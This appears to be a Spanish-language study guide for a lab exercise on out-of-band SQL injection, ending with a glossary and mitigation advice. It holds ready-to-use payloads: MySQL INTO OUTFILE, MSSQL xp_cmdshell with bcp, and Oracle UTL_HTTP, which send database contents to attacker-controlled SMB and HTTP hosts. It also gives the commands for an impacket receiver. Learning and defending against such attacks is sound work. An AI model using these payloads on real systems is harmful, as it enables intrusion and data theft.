# Out-of-band (OOB) SQL Injection — Guía paso a paso (MD)

## Resumen breve

OOB SQLi: técnica que separa canal de inyección del canal de exfiltración usando DNS/HTTP/SMB/archivos/ejecución de comandos. Se usa cuando respuestas directas están filtradas, sanitizadas o bloqueadas por WAF/IDS.

---

## Objetivo

Ejecutar una prueba de OOB SQLi para exfiltrar datos cuando la respuesta directa de la aplicación/DB está restringida. Registrar evidencia en un receptor controlado (SMB/HTTP/DNS).

---

## Requisitos previos

* Acceso a un parámetro vulnerable (p. ej. `visitor_name` en una query GET).
* Máquina atacante capaz de recibir conexiones (servidor SMB, servidor HTTP, servidor DNS con control de subdominios).
* Herramientas básicas: `python3`, `impacket` (ejemplos: `smbserver.py`), `smbclient`.
* Permisos y entorno de laboratorio (TryHackMe/entorno controlado).

---

## Flujo operativo — pasos ordenados para llevar a cabo la tarea

### Paso 1 — Identificar parámetro vulnerable

1. Encontrar entrada que afecta a la consulta SQL (p. ej. `?visitor_name=Tim`).
2. Probar terminadores de string y terminadores de sentencia (`'`, `";"`, `--`) para confirmar inyección y permitir múltiples queries.

   ```http
   GET /oob/search_visitor.php?visitor_name=Tim'
   ```

### Paso 2 — Determinar capacidad del motor DB

1. Verificar si la DB permite `INTO OUTFILE`, UDFs, paquetes (Oracle `UTL_HTTP`, MSSQL `xp_cmdshell`).
2. Si se tiene acceso a consultas, intentar `SHOW VARIABLES LIKE 'secure_file_priv';` (si es accesible).
   *Si no es accesible, proceder por prueba y error con rutas comunes.*

### Paso 3 — Preparar receptor externo

1. Para SMB (escribir archivos):

   ```bash
   cd /opt/impacket/examples
   python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp
   # En otra terminal: smbclient //ATTACKBOX_IP/logs -U guest -N
   ```
2. Para HTTP: disponer un servidor que registre GET/POST (`nc -l -p 80`, `python3 -m http.server` con logging, o endpoint personalizado).
3. Para DNS: configurar un dominio controlado y un servidor DNS que registre subdomain queries.

### Paso 4 — Construir payload adecuado al DB y al canal

* MySQL INTO OUTFILE → SMB:

  ```sql
  1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --
  ```
* MSSQL xp_cmdshell + bcp → SMB:

  ```sql
  EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\\\10.10.58.187\\logs\\out.txt" -c -T';
  ```
* Oracle UTL_HTTP → HTTP exfil:

  ```plsql
  DECLARE
    req UTL_HTTP.REQ;
  BEGIN
    req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?d=' || SENSITIVE_COLUMN);
    UTL_HTTP.GET_RESPONSE(req);
  END;
  ```
* DNS exfil (conceptual): construir consultas que provoquen lookups a `base32(data).exfil.tu-dominio.com`.

### Paso 5 — Inyectar payload

1. Insertar payload en el parámetro vulnerable y ejecutar la petición.

   ```http
   GET /oob/search_visitor.php?visitor_name=1'; SELECT @@version INTO OUTFILE '\\ATTACKBOX_IP\logs\out.txt'; --
   ```
2. Observar el receptor para confirmar llegada del archivo/consulta/registro.

### Paso 6 — Confirmar y recolectar evidencia

1. En SMB receiver: `ls /tmp` para listar `out.txt`.
2. En HTTP receiver: revisar logs de requests.
3. En DNS server: revisar queries recibidas con subdominios que contienen datos codificados.
4. Documentar rutas, timestamps, payload exacto y captura de pantalla/archivo.

---

## Comandos y ejemplos (referencia rápida)

**Levantar SMB receiver**

```bash
cd /opt/impacket/examples
python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp
smbclient //ATTACKBOX_IP/logs -U guest -N
```

**Payload MySQL (INTO OUTFILE a SMB)**

```sql
1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --
```

**Payload MSSQL (xp_cmdshell + bcp)**

```sql
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\\\10.10.58.187\\logs\\out.txt" -c -T';
```

**Payload Oracle (UTL_HTTP)**

```plsql
DECLARE
  req UTL_HTTP.REQ;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?d=' || SENSITIVE_COLUMN);
  UTL_HTTP.GET_RESPONSE(req);
END;
```

**Verificar secure_file_priv (si hay acceso)**

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

---

## Flashcard (frontal / contraportada)

* **Frontal:** ¿Qué es OOB SQLi y cuándo se usa?
* **Contraportada:** Técnica que separa el canal de inyección y el de exfiltración (DNS/HTTP/SMB/archivos/exec) para extraer datos cuando las respuestas directas están bloqueadas o filtradas.

---

## Glosario técnico (término — definición — ejemplo)

* **OOB (Out-of-band)** — Exfiltración por canal distinto al de la consulta. — *Generar DNS lookup con datos codificados.*
* **INTO OUTFILE** — MySQL: escribe resultados en archivo del sistema. — `SELECT user,pass FROM users INTO OUTFILE '/tmp/out.txt';`
* **secure_file_priv** — Variable MySQL que restringe rutas para operaciones de archivo. — `SHOW VARIABLES LIKE 'secure_file_priv';`
* **UDF (User-Defined Function)** — Función cargada en DB para extender capacidades (p. ej. HTTP). — `SELECT http_post('http://...')` si existe.
* **xp_cmdshell** — MSSQL: ejecuta comandos de sistema. — `EXEC xp_cmdshell 'dir C:\'`.
* **DNS exfiltration** — Encodificar datos en subdominios consultados por la DB hacia un DNS controlado. — *subdomain* = `b32(data).exfil.attacker.com`.
* **SMB/UNC** — Protocolo/forma de compartir archivos Windows; permite `\\IP\share\file`. — `INTO OUTFILE '\\\\ATTACKER_IP\\share\\file.txt'`.
* **UTL_HTTP / UTL_FILE** — Oracle: paquetes para HTTP y archivo desde PL/SQL. — Permiten exfil vía HTTP o escritura de archivos.

---

## Consideraciones operativas y mitigaciones (acción dirigida)

* Limitar privilegios de la cuenta de la aplicación: eliminar permisos FILE/xp_cmdshell/UTL_* y prohibir carga de UDFs.
* Configurar `secure_file_priv` a un directorio controlado y monitorizado; no dejar vacío.
* Restringir egress desde servidores DB (firewall) a sólo destinos necesarios.
* Monitorizar consultas que contengan terminadores de sentencia, rutas UNC, uso de paquetes UTL_*, llamadas a funciones no estándar o intentos de carga de UDFs.
* Loguear y alertar en DNS/HTTP saliente por subdominios o destinos inusuales.

---

## Notas finales (operacionales)

* Si `secure_file_priv` está definido, probar rutas dentro del directorio permitido.
* Si la DB no expone capacidades de red nativas, considerar UDFs o vectores de transferencia a nivel de sistema operativo (si está habilitado).
* Documentar cada intento y mantener pruebas reproducibles en laboratorio controlado.

---
